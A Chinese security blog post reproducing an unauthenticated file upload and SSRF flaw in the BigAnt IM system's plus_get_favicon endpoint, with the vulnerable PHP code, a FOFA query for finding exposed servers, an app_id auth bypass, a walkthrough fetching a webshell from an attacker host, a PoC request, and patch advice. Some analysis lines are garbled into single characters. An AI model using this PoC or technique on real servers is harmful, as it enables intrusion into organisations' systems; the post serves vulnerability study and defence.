#  【漏洞复现】高风险预警！大蚂蚁 BigAnt 即时通讯系统曝任意文件上传漏洞  
原创 xuzhiyang
                    xuzhiyang  玄武盾网络技术实验室   2026-03-12 01:45  
  
*免责声明：本文仅供安全研究与学习之用，  
严禁使用本内容进行未经授权的违规渗透测试，遵守网络安全法，共同维护网络安全，违者后果自负。  
##   
## 01 — 漏洞名称  
##   
  
大蚂蚁 (BigAnt) 即时通讯系统 plus_get_favicon 任意文件上传漏洞大蚂蚁 (BigAnt) 即时通讯系统 plus_get_favicon 任意文件上传漏洞。  
  
## 02 — 影响范围  
##   
  
大蚂蚁即时通讯系统作为国内主流的企业级 IM 产品，广泛应用于政府、国企、中小企业等各类组织的内部协同办公，此次漏洞影响范围覆盖度高，**所有 5.5.x 及以上版本均受影响**  
，其中包括官方最新发布的 6.0.1.20250407.1 版本。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PcyHAMIicw34alTRVdrNn3Kfow9TlPKvOFGRuLpVC06hibQgK5lNIm3fJibBtLFbg0o3Y2ufqFYeRVbuLrCicbPo9abyLt6sxHxHM77yGapoBSI/640?wx_fmt=png&from=appmsg "")  
  
  
经过测试，最新版本 6.0.1.20250407.1 也受影响  
  
## 03 — 漏洞简介  
##   
  
在政企数字化办公中，即时通讯系统作为内部沟通、数据传输的核心载体，其安全稳定性直接关乎企业核心数据资产安全。近期，杭州九麒科技旗下的大蚂蚁（BigAnt）即时通讯系统被曝出plus_get_favicon 接口存在高危任意文件上传漏洞，该漏洞利用门槛低、危害范围广，涉及 5.5.x 及以上多个版本，甚至最新 6.0.1.20250407.1 版本也未能幸免，给众多使用该系统的政企单位带来严重安全威胁，相关运维人员需立即重视并采取防护措施！  
  
漏洞核心风险：无需授权，服务器或被完全控制  
  
此次发现的 plus_get_favicon 接口任意文件上传漏洞，属于高危级安全漏洞，CVSS3.1 评分高达 9.8，其核心危害在于攻击者无需任何系统权限、无需用户交互，即可远程利用该漏洞发起攻击。  
  
漏洞的根源在于系统该 API 接口未对上传文件的类型、存储路径进行严格校验，攻击者可通过构造特制请求，绕过系统防护机制，将 PHP 等恶意脚本文件上传至服务器指定目录，甚至能通过../符号实现路径穿越，把恶意文件直接写入 Web 根目录。一旦上传成功，攻击者可通过访问恶意文件执行任意代码，进而完全控制服务器，后续可实施敏感数据窃取、企业通信记录泄露、数据篡改、内网渗透等一系列恶意操作，对政企单位的信息安全造成毁灭性打击。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PcyHAMIicw344WatddQSsGVS7ibicicvQt9ibCS3MvJz5VVrOcqDamNcbiacRSSOJLXMG212ibBr2UCbwd2PZE2ftzEL0ibOctrVxopaCibDWX0RWKls/640?wx_fmt=png&from=appmsg "")  
  
  
## 04 — 资产测绘  
  
  
针对本次漏洞，可通过 FOFA 搜索引擎使用以下语法快速检索全网受影响资产，及时排查自身网络设备风险：  
```
(body="/Public/static/admin/admin_common.js" && body="/Public/lang/zh-cn.js.js") || title="即时通讯 系统登录" && body="/Public/static/ukey/Syunew3.js"
```  
  
  
## 05 — 漏洞分析  
## 查看下 Application/Admin/Controller/PlusController.class.php 的实现原理。  
##   
  
![](https://mmbiz.qpic.cn/mmbiz_png/PcyHAMIicw360LtBaWgNUCbd5s0Pyg7VfQxfW23znJvicSA9WagxnQV0eFskcdUQf7KbTwCGexSNAMpKtnXOFbKurDtZC6eCuoVeMpuN6PzRA/640?wx_fmt=png&from=appmsg "")  
## 在程序最初的初始化阶段中，设定了当 app_id 为 pc_clientz 时，无需执行鉴权操作。  
## 再看 plus_get_favicon() 方法的实现原理：  
```
public function plus_get_favicon(){
    $plus_uri = I("plus_uri");
    if(!$plus_uri){
       Jump::errror(3002,"not found the plus_uri");
    }
    // 得到 host
    $parse_url = parse_url($plus_uri);
    $newUrl = sprintf("%s://%s:%d", $parse_url['scheme'], $parse_url['host'], $parse_url['port']);
    $content = file_get_contents($newUrl);
    if(preg_match("/rel=\".*icon\".+href=\"(.*)\"/U", $content, $match) === false){
       Jump::errror(3002,"not found the preg_match");
    }
    if(empty($match[1])){
       Jump::errror(3002,"not found the \$match[1]");
    }
    $img_url = $match[1];
    $dir =\Common\Lib\SaasSDK::getStoragePath(sp_saas_id(),'plus_favicon') ;
    sp_folder_create(SITE_PATH.$dir);
    $ext= substr($img_url,strrpos($img_url,'.'));
    $filepath=$dir.md5($img_url).$ext;
    $file_get_contents = file_get_contents($newUrl.$img_url);
    file_put_contents(SITE_PATH.$filepath, $file_get_contents);
    $data['img_url']=$filepath;
    Jump::success($data);
}
```  
  
初始阶段，用户借助 plus_uri 参数传入一个可被其完全操控的 URL 地址，随后系统会针对该 URL 开展一系列处理，其中涉及防病毒程序对恶意软件的检测环节：  
  
URL 解析与重构：程序调用 parse_url 函数对用户输入的 URL 进行拆  
解解析，接着利用 sprintf 函数重新拼接生成  
变量。具体场景说明：若用户输入的为，  
newUrl 最终会被格式化处理为http://attacker.com:80。需要注意  
的是，这一过程强制要求 URL 中包含端口信息；若用户未主动提供端口，sprintf 函数中的 % d 格式符可能引发非预期结果（例如端口被填充为 0），但攻击者只需在 URL 中显式指定端口（如：80），就能规避这一限制。  
  
首次服务器端请求伪造（SSRF）：程序通过 file_get_contents (发起网络请求，获取由攻击者控制的页面内容并赋值给  
content 变量。  
  
正则表达式提取：执行 preg_match ("/rel=".icon".+href="(.  
)"/U", $content, $match) 语句提取特定内容。具体场景说明：攻击者可在其控制的页面中植入如下内容：<link rel="icon" href="/shell.php">，此时正则表达式能够成功匹配该内容，并将 $match [1] 赋值为 /shell.php。  
  
后缀名提取：通过  
  
e  
x  
t  
  
=  
  
  
s  
u  
b  
s  
t  
r  
(  
img_url, strrpos ($img_url, '.')) 语句提取文件后缀。具体场景说明：strrpos 函数会查找 /shell.php 中最后一个 "." 的位置，substr 函数则从该位置开始截取至字符串末尾，最终得到的结果为.php。而程序并未对提取出的后缀名做合法性校验（比如验证是否为 jpg、png 等合法图片后缀）。  
  
第二次服务器端请求伪造（SSRF）：执行  
  
f  
i  
l  
e  
  
g  
  
  
e  
t  
  
c  
  
  
o  
n  
t  
e  
n  
t  
s  
  
=  
  
  
f  
i  
l  
e  
  
g  
  
  
e  
t  
  
c  
  
  
o  
n  
t  
e  
n  
t  
s  
(  
newUrl.$img_url) 语句发起请求。具体场景说明：服务器会再次向http://attacker.com:80/shell.php发起请求，获取攻击者预先放置的 PHP 木马文件内容。  
  
程序直接通过 substr 函数提取原始链接中的文件后缀，并将其直接拼接至本地文件名中，全程未设置任何白名单进行限制，最终导致了任意文件上传漏洞的产生。  
## 但是由于Apache服务器配置中存在如下内容：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PcyHAMIicw353icibBdbHwrQj7Yy4fHaMVRdO08pnRYQRlnXicUxHI83bWFq3Cw7BdSAISyfpAqUEqRugias0yreiaKNkT0micetXXY9Kbcjj270vc/640?wx_fmt=png&from=appmsg "")  
## 有针对data目录的php_admin_flag engine off配置，表示data目录禁止解析php,因此不能解析。但是可以上传html文件钓鱼或者作为恶意文件托管等、或者特别大的文件消耗磁盘容量造成因磁盘容量耗尽的DOS等危害，也是不容小觑。  
##   
## 06 — 漏洞复现（附 POC）  
  
  
需要注意thinkphp的路由特性，不区分大小写，且还支持如下等方式  
  
/api/dispersedOrg/plus_get_favicon.html  
  
/api/dispersedOrg/plus_get_favicon  
  
  
在本地http服务的默认首页如 index.html 文件内容包含 <link rel="icon" href="/del.php">  
 这种可以通过正则校验以及测试文件del.php的内容。  
```
POST /?m=Admin&c=Plus&a=plus_get_favicon HTTP/1.1
Host: bigant.mrxn.net
Content-Type: application/x-www-form-urlencoded
plus_uri=http://127.0.0.1:80&app_id=pc_client
```  
### 复现结果  
###   
  
发送上述请求后，若目标设备存在漏洞，将返回**200 OK**  
状态码，  
  
如图所示，我们成功上传文件到/data/plus_favicon/  
目录下。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PcyHAMIicw36O3Z65ciatbvkN7wbmE7pqlQhxLTicF3QorPwTOar4MRjN9KpicpRfPXjN8TOs2wW7mKb2EMJDlNxUKOZg2SNYtSArqFvN4TicpK4/640?wx_fmt=png&from=appmsg "")  
##   
## 07 — 应急修复建议  
  
  
针对此次高危漏洞，大蚂蚁官方已及时发布专项修复补丁，同时安全厂商也给出了临时缓解方案，建议使用该系统的单位**优先采用官方修复方案**  
，同时配合临时防护措施，全方位筑牢安全防线：  
#### 官方正式修复方案  
1. 直接访问大蚂蚁官方漏洞修复页面（https://www.bigant.cn/article/news/435.html）下载最新漏洞补丁包，按照官方指引完成补丁安装；  
  
1. 联系大蚂蚁官方技术支持（400-6059-110），获取对应版本的安全升级包，将系统升级至完成漏洞修复的安全版本；  
  
1. 完成修复后，建议对系统进行全面安全扫描，确认漏洞已彻底修复，无残留安全风险。  
  
#### 🛡️ 临时缓解措施（未完成官方修复前）  
1. 网络隔离：如非业务必需，暂时将大蚂蚁系统服务器从互联网暴露面撤出，限制公网访问，仅保留内网办公所需的访问权限；  
  
1. WAF 防护：在 Web 应用防火墙中配置防护规则，拦截包含../  
等路径穿越字符、恶意 PHP 语句的请求，同时限制对 plus_get_favicon 相关接口的异常访问；  
  
1. 权限管控：严格设置服务器上传目录的文件权限，将上传目录配置为**不可执行**  
，禁止服务器解析该目录下的脚本文件，即使攻击者上传恶意文件，也无法执行代码；  
  
1. 功能禁用：临时禁用系统中不必要的文件上传功能及相关 API 接口，减少攻击入口。  
  
### 举一反三，企业文件上传漏洞防护通用准则  
  
此次大蚂蚁漏洞并非个例，文件上传漏洞是 Web 应用中最常见的高危漏洞之一，头像上传、文档分享、附件提交等常见功能，若防护不当，都可能成为黑客的 “突破口”。结合此次漏洞，企业在日常安全运维中，需遵循以下通用防护准则，从根源上降低文件上传漏洞风险：  
1. **多层校验，白名单优先**  
：摒弃仅靠前端 JS 校验、扩展名黑名单的低效方式，采用 “前端校验 + 后端强制校验” 的多层防护，结合文件 MIME 类型、文件头（Magic Bytes）进行综合判断，仅允许.jpg、.png、.pdf 等业务必需的文件类型上传；  
  
1. **上传目录，隔离且禁执行**  
：将文件上传目录与 Web 根目录隔离，同时配置服务器（Nginx/Apache）禁止解析上传目录下的脚本文件，从根本上防止恶意文件执行；  
  
1. **文件重命名，避免路径预测**  
：对用户上传的文件进行随机字符串（如 UUID）重命名，不保留原始文件名，同时生成动态存储路径，让攻击者无法预测文件访问地址；  
  
1. **安全扫描，定期自查**  
：使用专业安全工具（如 Burp Suite、Nessus）定期对企业所有 Web 应用的文件上传功能进行漏洞扫描，及时发现并修复潜在问题；同时对上传文件进行病毒扫描、Web Shell 特征检测；  
  
1. **日志审计，异常追溯**  
：记录完整的文件上传日志，包括访问 IP、上传时间、文件名称、存储路径等信息，便于发现异常上传行为时快速追溯、处置。  
  
### 重要提醒：合法合规，切勿滥用漏洞  
  
最后需特别强调，网络安全漏洞的挖掘与研究需在**合法授权**  
的前提下进行，利用此次大蚂蚁漏洞未经授权攻击他人服务器，上传恶意脚本控制计算机信息系统的行为，已触犯《网络安全法》《刑法》等相关法律法规，将面临罚款、有期徒刑等法律制裁。  
  
- 随手点个「推荐」吧！  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/UM0M1icqlo0knIjq7rj7rsX0r4Rf2CDQylx0IjMfpPM93icE9AGx28bqwDRau5EkcWpK6WBAG5zGDS41wkfcvJiaA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp#imgIndex=5 "")  
  
声明：  
技术文章均收集于互联网，仅作为本人学习、记录使用。  
侵权删  
！  
！  
  
